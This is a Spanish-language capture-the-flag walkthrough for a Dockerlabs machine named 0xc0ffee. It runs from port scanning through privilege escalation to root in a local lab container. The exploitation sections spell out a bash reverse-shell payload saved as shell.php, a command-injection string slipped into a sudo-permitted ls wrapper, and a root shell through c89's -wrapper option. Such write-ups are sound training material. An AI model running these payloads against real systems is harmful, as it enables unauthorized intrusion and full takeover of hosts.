
# Writeup Template: Maquina `[ 0xc0ffee]`

- Tags: #0xc0ffee
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina 0xc0ffee](https://mega.nz/file/jJFVUICT#xhmECKrhWrCC8Z8O3xyelJYOh7OLUoA1Hml5-lut5SQ)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x 0xc0ffee.zip
sudo bash auto_deploy.sh 0xc0ffee.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80,7777 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp   open  http    Apache httpd 2.4.58 ((UbuntuNoble))
7777/tcp open  http    SimpleHTTPServer 0.6 (Python 3.12.3)
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada critico

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js
```

- **Hallazgos**:
	No reporta nada critico

## Enumeracion de [Servicio Web 7777]
Dirccion url:
```bash
http://172.17.0.2:7777/
```

Tenemos **directoryListing** asi que revisamos este archivo:
```bash
http://172.17.0.2:7777/secret/history.txt
```

Su contenido es:
```bash
En los albores del siglo XXI, EspaÃ±a se encontraba en medio de una revoluciÃ³n tecnolÃ³gica, donde las sombras de los servidores y el resplandor de las pantallas digitales eran el campo de batalla para los mÃ¡s astutos y habilidosos. Entre ellos, habÃ­a un nombre que resonaba con reverencia y misterio: Ãlvaro LÃ³pez. Conocido en la comunidad cibernÃ©tica como â€œEl Fantasma de Madridâ€, Ãlvaro era considerado el mejor hacker de EspaÃ±a, y su habilidad para penetrar los sistemas mÃ¡s seguros era casi legendaria.

Ãlvaro comenzÃ³ su andanza en el mundo de la ciberseguridad desde una edad temprana. Lo que comenzÃ³ como un simple interÃ©s en la informÃ¡tica se transformÃ³ en una pasiÃ³n por desentraÃ±ar los secretos mÃ¡s ocultos de las redes y sistemas de seguridad. Su habilidad para encontrar vulnerabilidades en sistemas aparentemente impenetrables le ganÃ³ una reputaciÃ³n que se extendÃ­a mÃ¡s allÃ¡ de las fronteras de EspaÃ±a.

Uno de los incidentes mÃ¡s notorios en la carrera de Ãlvaro ocurriÃ³ cuando se enfrentÃ³ a uno de los desafÃ­os mÃ¡s complejos de su vida. Un banco internacional de renombre, conocido por su nivel extremo de seguridad, habÃ­a sido blanco de un ataque, y el misterio giraba en torno a un archivo encriptado con la etiqueta "super_secure_password". Este archivo contenÃ­a informaciÃ³n crÃ­tica sobre las transacciones de alto valor, y su protecciÃ³n era de mÃ¡xima prioridad.

El banco habÃ­a desplegado una red de seguridad impenetrable, con capas de cifrado y autenticaciÃ³n de mÃºltiples factores, lo que hizo que el reto fuera aÃºn mÃ¡s emocionante para Ãlvaro. Tras semanas de investigaciÃ³n y anÃ¡lisis de los sistemas, el Fantasma de Madrid descubriÃ³ una pequeÃ±a pero crÃ­tica vulnerabilidad en el protocolo de encriptaciÃ³n utilizado. Con una mezcla de astucia y tÃ©cnica avanzada, pudo realizar un ataque sofisticado que permitiÃ³ descifrar el contenido protegido bajo el "super_secure_password".

Sin embargo, el talento de Ãlvaro no radicaba solo en su capacidad para hackear sistemas; tambiÃ©n era un maestro en la Ã©tica de la ciberseguridad. En lugar de utilizar la informaciÃ³n para sus propios fines, utilizÃ³ su acceso para alertar al banco sobre las fallas en su sistema y proporcionar recomendaciones para mejorar la seguridad. Su acto no solo demostrÃ³ su habilidad tÃ©cnica, sino tambiÃ©n su integridad y compromiso con la seguridad digital.

La hazaÃ±a de Ãlvaro LÃ³pez pronto se convirtiÃ³ en una leyenda en el mundo de la ciberseguridad. El banco, agradecido por su valiosa contribuciÃ³n, lo recompensÃ³ generosamente y lo invitÃ³ a colaborar en la mejora de sus sistemas de seguridad. La historia de El Fantasma de Madrid se convirtiÃ³ en un ejemplo de cÃ³mo la habilidad y la Ã©tica pueden coexistir en el mundo del hacking.

Con el tiempo, Ãlvaro siguiÃ³ influyendo en el campo de la ciberseguridad, ofreciendo conferencias y talleres sobre la importancia de la protecciÃ³n de datos y la Ã©tica en el hacking. Su legado perdurÃ³, y su nombre se convirtiÃ³ en sinÃ³nimo de excelencia en el arte de la ciberseguridad, recordado como el mejor hacker que EspaÃ±a habÃ­a conocido.
```

Analizando el contenido tenemos esta cadena:
```bash
"super_secure_password"
```

Sabiendo que en la primer url
```bash
http://172.17.0.2/
```

### Credenciales Encontradas
Tenemos una como especie de login que pide una clave secreta probaremos la siguiente cadena,
```bash
super_secure_password
```

Y tenemos acceso al panel principal en donde nos lleva a la siguiente pagina:
```bash
http://172.17.0.2/super_ultra_secure_page/
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
**Nota** Tenemos un panel que nos permite realizar una configuracion y nos permite guardarla con nombre y su extension, Asi que intentaremos aprovecharnos de esto para crear un archivo malicioso y lo aremos de la siguiente manera:

###### Configuration Identifier:
```bash
shell.php
```

###### Configuration Data:
```bash
#!/bin/bash

sh -i >& /dev/tcp/172.17.0.1/444 0>&1
```

**Nota** Nos ponemos en eschucah por el puerto:
```bash
nc -nlvp 444
```

### Ejecucion del Ataque
###### Execute Remote Configuration:
Ahora intentaremos ejecutara nuestro archivo malicioso:
```bash
shell.php
```

Ya realizadas las configuraciones, Vemos que nos deja guardarlo: y si recargamos la siguiente url aqui se cargan los archivos que configuremos:
```bash
http://172.17.0.2:7777/
```

---
## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
cat /etc/passwd | grep "sh"
```

Tenemos estos usuarios del sistema:
```bash
root:x:0:0:root:/root:/bin/bash
codebad:x:1001:1001:codebad,,,:/home/codebad:/bin/bash
metadata:x:1000:1000:metadata,,,:/home/metadata:/bin/bash
```

Listamos los permisos para los directorios de los usuarios:
```bash
ls -l /home
```

Tenemos capacidad de atravesar su directorio personal del usuario: **codebad**
### Explotacion de Privilegios

###### Usuario `[ www-data ]`:
Ingresamos al directorio del usuario **codebad** en la siguiente ruta tenemos un archivo:
```bash
/home/codebad/secret
```

Tenemos el siguiente contenido:
```bash
En el mundo digital, donde la protección es vital,
existe algo peligroso que debes evitar.
No es un virus común ni un simple error,
sino algo más sutil que trabaja con ardor.

Es el arte de lo malo, en el software es su reino,
se oculta y se disfraza, su propósito es el mismo.
No es virus, ni gusano, pero se comporta igual,
toma su nombre de algo que no es nada normal.

¿Qué soy?
```

### Lista de posibles nombres:
1. **Troyano** .
2. **Caballo de Troya** (su nombre completo).
3. **Software malicioso** (traducción de _malware_).
4. **Engaño digital** (por su estrategia de disfraz).
5. **Silencioso** (por actuar sin ser detectado).
6. **Infiltrante** (por acceder a sistemas ocultamente).

Probando tanto en ingles como espanol tenemos con los usuarios del sistema logramos loguearnos como el usuario **codebad**
```bash
# Comando para escalar al usuario: ( codebadh )
su codebad # ( malware )
```

###### Usuario `[ codebad ]`:
Listando los permisos para este usuario tenemos:
```bash
sudo -l

User codebad may run the following commands on fca549ab3456:
    (metadata : metadata) NOPASSWD: /home/codebad/code
```

Si intentamos ejecutarlo:
```bash
sudo -u metadata /home/codebad/code whoami
```

Nos retorna lo siguiente:
```bash
/bin/ls: cannot access 'whoami': No such file or directory
```

Vemos que se esta ejecutando el comando **ls** por detras y nos pide como **input** una ruta o algo similar:
Si le pasamos una ruta vemos que funciona:
```bash
sudo -u metadata /home/codebad/code /home/metadata/
```

Nos lista su contenido de ese directorio:
```bash
pass.txt  user.txt
```

El contenido aun no lo podemos ver ya que solo aplica un **ls** pero aplicando concatenacion de comandos intentaremos colar un segundo comando:
```bash
sudo -u metadata /home/codebad/code /home/metadata/ && 'whoami'
```

Tenemos exito al ejecutar comandos asi que migramos de usuario:
```bash
# Comando para escalar al usuario: ( metadata )
sudo -u metadata /home/codebad/code '-la; bash -i'
```

###### Usuario `[ metadata ]`:
Tenemos en la siguiente ruta un ejecutable:
```bash
/usr/local/bin/metadatosmalos
```

Revisando su contenido:
```bash
#!/bin/bash

#chmod u+s /bin/bash
whoami | grep 'pass.txt'
```

Ahora probamos es mismo nombre del archivo  como contrasena para este usuario
```bash
sudo -l # ( metadatosmalos )

User metadata may run the following commands on fca549ab3456:
    (ALL : ALL) /usr/bin/c89 # Tenemos una via potencial de migrar a root
```

Explotando el binario
```bash
# Comando para escalar al usuario: ( root )
sudo -u root /usr/bin/c89 -wrapper /bin/bash,-s .
```

---
## Evidencia de Compromiso
Flags:
```bash
root@fca549ab3456:~# cat root.txt 
d6c4a33bec66ea2948f09a0db32335de
```

```bash
# Captura de pantalla o output final
root@fca549ab3456:~# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a ejecutar comandos en un formulario
2. Aprendimos a explotar el binario **ls**
3. Aprendimos el binario **c89**